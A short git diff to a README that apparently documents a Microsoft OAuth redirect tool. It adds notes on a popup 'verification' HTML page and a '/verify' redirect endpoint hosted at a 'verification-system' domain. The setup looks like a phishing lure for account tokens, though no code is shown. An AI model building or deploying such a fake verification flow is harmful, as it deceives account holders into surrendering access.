@@ -6,7 +6,11 @@ Check this out too https://github.com/Normi-Dev/OAR
 ## READ
 PLEASE READ THIS WHOLE THING BEFORE YOU DM ME PLEASE MAN PLSSSSSS
 
-## UPDATE 
+## UPDATE 2
+
+I was bored and added a fancy mf html page with a button that opens a popup window (will only work if you use the reidrect_uri/verify aka the update below)
+
+## UPDATE 1
 
 Now you dont need the whole login.live link, just use your redirect link and add /verify to it, example :"https://verification-system.onrender.com/verify"
 
